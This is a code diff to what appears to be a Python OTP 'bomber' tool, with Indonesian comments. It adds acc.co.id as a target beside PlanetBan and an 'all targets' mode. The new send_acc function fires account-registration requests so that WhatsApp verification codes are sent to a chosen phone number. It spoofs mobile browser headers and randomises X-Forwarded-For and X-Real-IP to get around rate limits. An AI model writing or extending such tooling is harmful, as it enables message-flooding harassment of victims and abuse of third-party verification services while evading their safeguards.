@@ -41,7 +41,9 @@ console = Console()
 APIS = {
     1: {"name": "PlanetBan",   "desc": "WhatsApp",  "tag": "PLB",
         "cooldown": 60, "color": "bright_red",  "method": "planetban"},
-    2: {"name": "ALL TARGETS", "desc": "Semua API", "tag": "ALL",
+    2: {"name": "ACC.co.id",   "desc": "WhatsApp",  "tag": "ACC",
+        "cooldown": 60, "color": "bright_yellow", "method": "acc"},
+    3: {"name": "ALL TARGETS", "desc": "Semua API", "tag": "ALL",
         "cooldown": 0,  "color": "bold cyan",   "method": "all"},
 }
 
@@ -277,8 +279,49 @@ def send_planetban(phone: str) -> dict:
         data=json.dumps({"phone": pb, "purpose": "register", "method": "whatsapp"}),
     )
 
+def send_acc(phone: str) -> dict:
+    # format lokal: 08xxxxxxxx
+    num  = phone if phone.startswith("62") else "62" + phone.lstrip("0")
+    local = "0" + num[2:]
+    payload = json.dumps([{
+        "user_id":  None,
+        "action":   "register",
+        "send_to":  local,
+        "provider": "whatsapp",
+    }])
+    return safe_post(
+        "https://www.acc.co.id/register/new-account",
+        headers={
+            "User-Agent":            rand_ua(),
+            "Accept":                "text/x-component",
+            "Accept-Encoding":       "gzip, deflate, br, zstd",
+            "Accept-Language":       "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+            "Content-Type":          "text/plain",
+            "next-action":           "7fd7799322a505bdfacd0dcd6cac5aa319e2350972",
+            "next-router-state-tree": (
+                "%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A"
+                "%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children"
+                "%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D"
+                "%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D"
+            ),
+            "Origin":                "https://www.acc.co.id",
+            "Referer":               "https://www.acc.co.id/register/new-account",
+            "Sec-Fetch-Site":        "same-origin",
+            "Sec-Fetch-Mode":        "cors",
+            "Sec-Fetch-Dest":        "empty",
+            "sec-ch-ua-platform":    '"Android"',
+            "sec-ch-ua-mobile":      "?1",
+            "sec-ch-ua":             rand_sec_ch(),
+            "X-Requested-With":      "com.chimbori.hermitcrab",
+            "X-Forwarded-For":       rand_ip(),
+            "X-Real-IP":             rand_ip(),
+        },
+        data=payload,
+    )
+
 def dispatch(method: str, phone: str) -> dict:
     if method == "planetban": return send_planetban(phone)
+    if method == "acc":       return send_acc(phone)
     return {}
 
 # ══════════════════════════════════════════════════════════════
